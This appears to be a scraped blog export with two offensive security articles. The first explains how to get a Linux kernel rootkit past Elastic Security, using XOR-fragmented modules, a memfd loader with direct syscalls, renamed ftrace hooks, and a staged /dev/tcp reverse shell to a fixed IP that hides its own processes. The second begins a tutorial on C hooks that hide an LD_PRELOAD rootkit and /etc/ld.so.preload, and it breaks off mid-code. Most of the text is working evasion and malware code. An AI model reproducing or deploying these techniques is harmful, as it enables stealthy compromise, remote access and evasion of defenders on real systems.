files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent 